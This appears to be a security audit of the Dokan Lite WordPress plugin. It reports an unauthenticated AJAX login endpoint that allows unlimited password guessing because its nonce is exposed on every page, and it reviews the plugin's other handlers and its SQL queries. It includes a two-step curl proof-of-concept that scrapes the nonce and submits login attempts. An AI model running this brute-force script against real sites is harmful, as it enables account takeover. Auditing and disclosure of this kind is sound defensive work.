# Dokan Lite v5.0.12 — Nopriv AJAX Audit (Brute Force via wp_signon)

**Plugin:** dokan-lite v5.0.12, ~30,000 installs
**Audit date:** 2026-08-12
**Finding:** Unauthenticated brute force via `wp_ajax_nopriv_dokan_login_user`
**CVSS:** 5.3 (Medium) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

## Vulnerability: `dokan_login_user` Brute Force Enablement

**File:** `includes/Ajax.php:1112-1166`

### Registration
```php
// Ajax.php:56
add_action( 'wp_ajax_nopriv_dokan_login_user', [ $this, 'login_user' ] );
```

### Handler
```php
public static function login_user() {
    check_ajax_referer( 'dokan_reviews' );                          // nonce check

    parse_str( $_POST['form_data'], $form_data );

    $user_login    = sanitize_text_field( $form_data['dokan_login_form_username'] );
    $user_password = sanitize_text_field( $form_data['dokan_login_form_password'] );  // strips HTML from password!

    $wp_user = wp_signon( [
        'user_login'    => $user_login,
        'user_password' => $user_password,
    ], '' );

    if ( is_wp_error( $wp_user ) ) {
        wp_send_json_error( [ 'message' => 'Wrong username or password.' ], 400 );
    }

    wp_set_current_user( $wp_user->data->ID, $wp_user->data->user_login );
    // ... cookie handling ...
    wp_send_json_success( $response );
}
```

### Why the Nonce Is Not a Barrier

The `dokan_reviews` nonce is generated in `Assets.php:862`:
```php
'nonce' => wp_create_nonce( 'dokan_reviews' ),
```

This runs in `enqueue_front_scripts()` hooked to `wp_enqueue_scripts` (Assets.php:28-29) — executing on **every frontend page load** for all visitors. An attacker:

1. GET any page (e.g., `https://target.com/`)
2. Extract the nonce from the localized JS (`dokan.nonce`)
3. Use it to call `wp_ajax_nopriv_dokan_login_user` repeatedly — no rate limit

### PoC
```bash
# Step 1: Get nonce from any page
NONCE=$(curl -s https://target.com/ | grep -oP 'nonce.*?:"([^"]+)"' | head -1 | grep -oP ':"([^"]+)"' | tr -d ':"')

# Step 2: Brute force
curl -s -X POST https://target.com/wp-admin/admin-ajax.php \
  -d "action=dokan_login_user" \
  -d "_wpnonce=$NONCE" \
  -d "form_data=dokan_login_form_username=admin&dokan_login_form_password=password123"
```

### Additional Bug: Password Sanitization
`sanitize_text_field()` on `$user_password` strips HTML tags. Users with `<>` or HTML-like sequences in their passwords cannot log in via this endpoint.

### Fix
Add rate limiting (transient-based attempt counter per IP+username), enforce minimum delay between attempts, or require CAPTCHA. Consider whether nopriv login is necessary at all.

## Other Nopriv Handlers (All Secure)

| Handler | File:Line | Security |
|---------|-----------|----------|
| `dokan_contact_seller` | Ajax.php:411 | Nonce ✅, `sanitize_text_field()` on message ✅, NOT stored in DB ✅, `esc_html()` in email templates ✅ — no stored XSS |
| `dokan_pageview` | PageViews.php:73 | Nonce ✅, `absint()` on post_id ✅, only increments view counter |
| `shop_url` | Ajax.php:163 | Nonce ✅, `sanitize_text_field()` on slug ✅, uses `get_user_by()` — minor user enumeration |
| `dokan_seller_listing_search` | Ajax.php:649 | Nonce ✅, uses `WP_User_Query` — no raw SQL |
| `dokan_json_search_products_and_variations` | Ajax.php:766 | Nonce ✅, `$wpdb->prepare()` + `esc_like()` ✅ |
| `dokan_get_login_form` | Ajax.php:1090 | Nonce ✅, returns static HTML |
| `dokan_store_product_search_action` | Hooks.php:64 | Nonce ✅, `$wpdb->prepare()` + `esc_like()` ✅, all output escaped |

## SQL Injection Analysis

22 `$wpdb` calls without `prepare()` found across the codebase. None reachable from nopriv handlers:
- `Product/Hooks.php:106` — uses `$wpdb->prepare()` ✅
- `Product/functions.php:407` — uses `$wpdb->prepare()` ✅
- `ProductCategoryCache.php:79` — `$products` is `implode(',', array_map('absint', ...))` ✅
- All other unprepared queries are in upgrade scripts, admin-only paths, or use integer-cast values

## Key Lessons

1. **`wp_signon()` in nopriv AJAX = brute force vector.** Not auth bypass, but unlimited-speed password guessing. Check nonce availability and rate limiting.
2. **Nonces generated on every page are not a barrier.** `wp_create_nonce()` + `wp_localize_script()` = nonce available to all visitors.
3. **`sanitize_text_field()` on passwords is a bug.** Strips valid characters, prevents some users from authenticating.
4. **Contact form messages that are sanitized + emailed (not stored) are not stored XSS.** Always trace the full data flow: input → storage → output.
5. **22 unprepared SQL queries ≠ 22 SQLi vulnerabilities.** Trace each to check if user input reaches the query unparameterized. Most use `absint()`, `$wpdb->prepare()`, or are in admin/upgrade-only paths.
